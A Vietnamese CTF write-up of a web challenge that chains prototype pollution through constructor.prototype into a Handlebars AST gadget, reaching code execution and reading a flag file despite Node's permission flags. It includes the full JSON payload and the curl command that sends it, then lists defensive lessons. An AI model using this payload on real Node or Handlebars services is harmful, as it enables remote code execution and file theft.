---
title: Do You Know Lika?
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: hard
tags:
  - Prototype Pollution
  - Handlebars
  - RCE
---

# Do You Know Lika — Write-up

**Thể loại:** Web · **Kỹ thuật:** Prototype Pollution → Handlebars AST gadget → RCE trong worker

## Tóm tắt

Server nhận JSON cấu hình postcard, gộp vào object bằng hàm đệ quy `mergeTheme`. Bộ lọc chỉ chặn key `__proto__`, nhưng không chặn `constructor.prototype`. Nhờ đó ta làm ô nhiễm `Object.prototype`. Sau đó Handlebars compile một AST do ta nhúng vào, và phần `NumberLiteral` được chèn thẳng thành code JS chạy trong worker. Worker có Node permission model nhưng vẫn đọc được file qua `process.getBuiltinModule("fs")`.

## Các bước

1. **Lỗ hổng gộp object** (`worker.js`): `mergeTheme` ghi đệ quy vào target. Với `theme.constructor.prototype.X = ...`, key `X` được gán vào `Object.prototype`.
2. **Bộ lọc không đầy đủ** (`server.js`, `validateJob`): chỉ chặn `__proto__`, nên `constructor.prototype` lọt qua.
3. **Gadget Handlebars**: `Handlebars.compile(job.template, {preventIndent: true})` đọc các thuộc tính AST từ prototype. Ta đặt một `Program` có `MustacheStatement` với `NumberLiteral`, value là một IIFE:

   ```js
   (()=>{throw new Error(process.getBuiltinModule("fs").readFileSync("/tmp/lika/flag.txt","utf8"))})()
   ```

   Khi compile, IIFE này được chèn vào code đã sinh và chạy.
4. **Lấy kết quả**: `/api/preview` trả về 422 khi worker báo `ok:false`, và nội dung lỗi chứa nội dung file flag.

Payload:

```json
{
  "template": "x",
  "theme": {
    "constructor": {
      "prototype": {
        "type": "Program",
        "body": [{
          "type": "MustacheStatement",
          "path": 0,
          "loc": {"start": 0, "end": 0},
          "params": [{
            "type": "NumberLiteral",
            "value": "(()=>{throw new Error(process.getBuiltinModule(\"fs\").readFileSync(\"/tmp/lika/flag.txt\",\"utf8\"))})()"
          }]
        }]
      }
    }
  },
  "model": {}
}
```

Gửi bằng:

```sh
curl -s -X POST "$URL/api/preview" -H 'Content-Type: application/json' --data-binary @payload.json
```

Đã kiểm chứng trên bản sao local (đổi đường dẫn flag sang file giả): lỗi trả về đúng nội dung file.

## Vì sao cần `process.getBuiltinModule`

Worker khởi động với `--permission --allow-fs-read=...`. Khi chạy `require('fs')` hay `import fs` thì bị từ chối. Nhưng `process.getBuiltinModule` trong phiên bản Node này trả về module `fs` mà không đi qua kiểm tra permission, nên đọc được `/tmp/lika/flag.txt`.

## Bài học

- Khi gộp object do người dùng cung cấp, phải chặn cả `__proto__`, `constructor` và `prototype`, hoặc dùng `Object.create(null)` / kiểm tra `hasOwnProperty`.
- Sandbox dựa vào permission flag không đủ nếu còn API cho phép lấy module tích hợp sẵn.
- Các engine template (Handlebars, EJS, Pug...) có thể bị khai thác qua AST/options khi input không tin cậy được đưa vào compile.
